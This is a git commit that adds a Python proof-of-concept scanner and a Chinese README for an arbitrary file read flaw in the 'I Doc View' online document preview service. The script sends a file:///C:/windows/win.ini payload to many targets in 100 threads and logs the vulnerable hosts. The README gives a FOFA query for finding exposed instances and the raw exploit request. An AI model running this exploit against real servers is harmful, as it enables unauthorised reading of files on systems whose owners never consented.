c4e58ac8af3e921be1d7927692e63a75f2a3882f
hardog123 <3331551889@qq.com>
2024-06-18 19:30:24 +0800

    Add files via upload

---
+++ POC/DocView在线文档预览任意文件读取/DocView在线文档预览任意文件读取.py
@@ -0,0 +1,71 @@
+import requests,sys,argparse,json
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+GREEN = '\033[92m'  # 输出颜色
+RESET = '\033[0m'
+
+def banner():
+    banner = """
+ ██░ ██  ▄▄▄       ██▀███  ▓█████▄  ▒█████    ▄████ 
+▓██░ ██▒▒████▄    ▓██ ▒ ██▒▒██▀ ██▌▒██▒  ██▒ ██▒ ▀█▒
+▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌▒██░  ██▒▒██░▄▄▄░
+░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌▒██   ██░░▓█  ██▓
+░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒░▒████▓ ░ ████▓▒░░▒▓███▀▒
+ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒ ░ ▒░▒░▒░  ░▒   ▒ 
+ ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░   ░ 
+ ░  ░░ ░  ░   ▒     ░░   ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░   ░ 
+ ░  ░  ░      ░  ░   ░        ░        ░ ░        ░ 
+                            ░                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+                                    version: 1.0
+                                    author:Hardog
+"""
+    print(banner)
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description='DocView在线文档预览 任意文件读取')
+    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
+    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
+    args = parser.parse_args()
+    #判断输入的参数是单个还是文件
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list=[]
+        with open(args.file,"r",encoding="utf-8") as f:
+            for url in f.readlines():
+                url_list.append(url.strip().replace("\n",""))
+        #多线程
+        mp = Pool(100)
+        mp.map(poc, url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+def poc(target):
+    payload_url = "/view/qJvqhFt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi"
+    url = target+payload_url
+    headers={
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Accept-Language': 'zh-CN,zh;q=0.9',
+        'Connection': 'close'
+    }
+    try:
+        res = requests.get(url=url,headers=headers,verify=False,timeout=10)
+        data_dict = json.loads(res.text)
+        code_value = data_dict.get("code")
+        if res.status_code == 200 and code_value == 1:
+            print(f"{GREEN}[+]该网站存在任意文件读取漏洞，url为{target}\n{RESET}")
+            with open('result.txt','a',encoding='utf-8') as fp:
+                        fp.write(target+"\n")
+                        return True
+        else:
+            print(f"[-]该网站不存在任意文件读取漏洞")
+    except :
+        print(f"[*]该网站无法访问")
+        return False
+
+if __name__ == '__main__':
+    main()
---
+++ POC/DocView在线文档预览任意文件读取/Readme.md
@@ -0,0 +1,30 @@
+# DocView在线文档预览任意文件读取
+
+## 1.漏洞描述
+
+
+
+## 2.搜索语法
+
+```plain
+fofa：title=="在线文档预览 - I Doc View"
+```
+
+## 3.漏洞复现
+
+```plain
+GET /view/qJvqhFt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi HTTP/1.1
+Host: 127.0.0.1
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+
+```
+
+![image-20240618192923225](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618192923225.png)
